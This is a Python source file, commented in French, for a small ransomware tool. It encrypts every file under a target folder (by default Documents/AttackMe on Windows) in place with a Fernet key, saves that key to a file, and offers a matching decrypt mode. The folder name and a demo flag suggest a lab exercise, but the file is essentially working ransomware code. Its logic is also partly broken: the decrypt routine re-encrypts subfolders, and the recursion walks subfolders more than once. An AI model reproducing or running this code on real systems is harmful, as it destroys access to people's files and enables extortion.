import argparse
import platform,os
#from pathlib import Path
import string,random
from cryptography.fernet import Fernet


sys = platform.system()
actual_user = os.getlogin()

def compute_default_path(OS = platform.system(),user = os.getlogin()):
    if OS == "Windows":
        target_folder = os.path.realpath("C:/Users/"+user+"/Documents/AttackMe")
    # TODO : UNIX Porting
    return target_folder

parser = argparse.ArgumentParser(description="Ransomware dans tes morts",formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser.add_argument("-e","-encrypt","--encrypt", action="store_true",help="Encryption Mode", default=None)
parser.add_argument("-d","-decrypt","--decrypt", action="store_true",help="Decryption Mode",default =None )
parser.add_argument("-k","-key","--key",help="Path to key file",default =None )
parser.add_argument("--path","-path","-p", help="Répertoire Cible, par défaut sur windows ",default=compute_default_path())
parser.add_argument("--demo","-demo",action="store_true" ,help="Mode de démonstration",default=False)
parser.add_argument("-v","-verbose","--verbose",action="store_true",help="Active l'affichage des actions en temps réel", default = False)
# TODO : Add alert feature (html page to avert from the attack)

args = parser.parse_args()
config = vars(args)


def encrypt(key,path):
    global config
    encryptor = Fernet(key)
    if config['verbose']:
        print('Démarrage de la fonction de chiffrement')
    for racine,repertoires,fichiers in os.walk(path):
        if repertoires != []:
            for repertoire in repertoires:
                print(os.path.realpath(racine+"\\"+repertoire))
                encrypt(key,os.path.join(racine,repertoire))
        if fichiers != []:
            for fichier in fichiers:
                #print ({'racine':racine,'repertoires':repertoires,'fichier':fichier})
                #print(os.path.realpath(racine+fichier))
                print()
                print(os.path.realpath(racine+"\\"+fichier))
                with open(os.path.realpath(racine+"/"+fichier), 'rb') as file:
                    original = file.read()
                encrypted = encryptor.encrypt(original)
                with open(os.path.join(racine,fichier), 'wb') as encrypted_file:
                    original = encrypted_file.write(encrypted)
                if config['verbose']:print("Fichier Chiffré : "+os.path.join(racine,fichier))
    return

def decrypt(key,path):
    global config
    encryptor = Fernet(key)
    if config['verbose']:
        print('Démarrage de la fonction de chiffrement')
    for racine,repertoires,fichiers in os.walk(path):
        if repertoires != []:
            for repertoire in repertoires:
                print(os.path.realpath(racine+"\\"+repertoire))
                encrypt(key,os.path.join(racine,repertoire))
        if fichiers != []:
            for fichier in fichiers:
                #print ({'racine':racine,'repertoires':repertoires,'fichier':fichier})
                #print(os.path.realpath(racine+fichier))
                print()
                print(os.path.realpath(racine+"\\"+fichier))
                with open(os.path.realpath(racine+"/"+fichier), 'rb') as file:
                    original = file.read()
                encrypted = encryptor.decrypt(original)
                with open(os.path.join(racine,fichier), 'wb') as encrypted_file:
                    original = encrypted_file.write(encrypted)
                if config['verbose']:print("Fichier Chiffré : "+os.path.join(racine,fichier))
    return

def main():
    global config
    # STEP 0 = SET TARGET PATH
    target = compute_default_path()
    if config['path']!=compute_default_path():
        target= os.path.realpath(config['path'])    
    # NOT A STEP - VERBOSE MODE
    if config['verbose']:
        print("Mode verbose activé\n Emplacement cible de l'attaque -->"+target)
    # ENCRYPT_MODE
    if config['encrypt']==True:
        #STEP 1 = GENERATE A RANDOM KEY TO ENCRYPT FILE 
        key = Fernet.generate_key()
        with open(input("Nom du fichier contenant la clé :")+".key","wb") as filekey:
            filekey.write(key)
        encrypt(key,target)
    #DECRYPT_MODE
    if config['decrypt']==True:
        #STEP 1 = FILES DECRYPTION
        if config['key'] == None : 
            raise ValueError("Missing Decryption key")
        key = open(config['key'], "rb").read()
        print(key)
        decrypt(key,target)
    return

#print(config)
main()
#print(config['path'])
#print(config)
# Return {'encrypt': None, 'decrypt': None, 'key': None, 'path': 'C:\\Users\\Administrator\\Documents', 'demo': False, 'keyLength': 25, 'verbose': False}